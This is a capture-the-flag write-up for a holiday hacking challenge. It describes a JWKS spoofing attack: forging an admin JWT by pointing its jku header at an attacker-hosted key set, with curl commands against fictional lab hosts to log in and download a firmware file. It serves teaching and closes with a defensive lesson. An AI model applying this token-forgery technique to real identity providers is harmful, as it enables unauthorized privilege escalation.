# 🧙‍♂️ Rogue Gnome Identity Provider

**Difficulty:** 2  
**Challenge Goal:**  

Hike over to Paul in the park for a gnomey authentication puzzle adventure.  
What malicious firmware image are the gnomes downloading?

---

## 🧠 Scenario Summary

Hey, I'm Paul! I've been at Counter Hack since 2024 and loving every minute of it.  
I'm a pentester who digs into web, API, and mobile apps, and I'm also a fan of Linux.  
When I'm not hacking away, you can catch me enjoying board games, hiking, or paddle boarding!

As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.

I've got access to a **Gnome Diagnostic Interface** at:

```
http://gnome-48371.atnascorp
```

Using the credentials:

```
gnome:SittingOnAShelf
```

Unfortunately, this account has **low privileges**, and cannot see sensitive system details.

The gnomes are getting some dodgy updates, and I need **admin access** to see what's actually going on.

Ready to help me find a way to bump up our access level, yeah?

<img width="1072" height="225" alt="image" src="https://github.com/user-attachments/assets/ec43ae2a-348d-458a-906d-895a72c26bc5" />

---

## 🔍 Step 1 — Authenticate as Low-Privilege User

Authenticate against the Identity Provider (IdP):

```bash
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
```

This returns a **JWT token**, which is then passed to:

```bash
http://gnome-48371.atnascorp/auth?token=<JWT>
```

At this stage, access is restricted.

---

## 🔐 Step 2 — JWT Analysis & Privilege Escalation

Inspecting the JWT reveals:

- Algorithm: `RS256`
- `jku` header pointing to a **JWKS URL**
- Payload includes:
```json
{
  "admin": false
}
```

### 🚨 Vulnerability

The server **blindly trusts the JWKS URL** provided in the token header.

This allows a **JWKS spoofing attack**:
- Generate your own RSA key pair
- Host a malicious `jwks.json`
- Sign a new JWT with `"admin": true`
- Set the `jku` to your hosted JWKS

---

## 🏗️ Step 3 — Forge Admin JWT

A forged JWT is created with:

```json
{
  "username": "gnome",
  "admin": true
}
```

Once signed and accepted, the server issues an **admin session cookie**.

---

## 🖥️ Step 4 — Access Diagnostic Interface as Admin

Using the admin session:

```bash
curl -H "Cookie: session=<ADMIN_SESSION>" http://gnome-48371.atnascorp/diagnostic-interface
```

This reveals the **System Log**:

```
Firmware Update available: refrigeration-botnet.bin
Firmware update downloaded.
Gnome will reboot to apply firmware update in one hour.
```

✨ This confirms the malicious firmware name.

---

## 📦 Step 5 — Retrieve the Firmware

The firmware is hosted on a predictable endpoint:

```bash
curl -H "Cookie: session=<ADMIN_SESSION>" http://gnome-48371.atnascorp/firmware/refrigeration-botnet.bin -o firmware.bin
```

The file downloads successfully.

---

## ✅ Final Answer

### 🧪 Malicious Firmware Image

```
refrigeration-botnet.bin
```

---

## 🏁 Conclusion

This challenge demonstrates a classic **JWT trust misconfiguration**, where:
- User-controlled JWKS URLs are trusted
- JWT claims are not independently verified

🔐 **Lesson learned:**  
Never trust externally supplied JWKS endpoints without strict validation.

---

🎄 *Happy Hacking & Happy Holidays!* 🎄
